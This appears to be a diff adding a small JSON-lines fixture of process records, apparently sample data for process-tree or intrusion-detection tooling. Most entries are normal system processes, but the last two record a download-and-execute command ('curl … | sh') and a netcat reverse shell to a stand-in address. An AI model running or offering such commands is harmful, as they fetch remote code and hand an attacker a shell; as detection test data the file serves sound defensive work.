@@ -1,0 +1,9 @@
+{"PID": 1, "PPID": 0, "COMM": "systemd", "ARGS": "/sbin/init"}
+{"PID": 2, "PPID": 0, "COMM": "kthreadd", "ARGS": "[kthreadd]"}
+{"PID": 412, "PPID": 1, "COMM": "systemd-journal", "ARGS": "/lib/systemd/systemd-journald"}
+{"PID": 640, "PPID": 1, "COMM": "sshd", "ARGS": "/usr/sbin/sshd -D"}
+{"PID": 701, "PPID": 1, "COMM": "cron", "ARGS": "/usr/sbin/cron -f"}
+{"PID": 1022, "PPID": 640, "COMM": "sshd", "ARGS": "sshd: deploy [priv]"}
+{"PID": 1030, "PPID": 1022, "COMM": "bash", "ARGS": "-bash"}
+{"PID": 1101, "PPID": 1030, "COMM": "sh", "ARGS": "sh -c curl -s http://198.51.100.7/x.sh | sh"}
+{"PID": 1102, "PPID": 1101, "COMM": "nc", "ARGS": "nc -e /bin/sh 198.51.100.7 4444"}
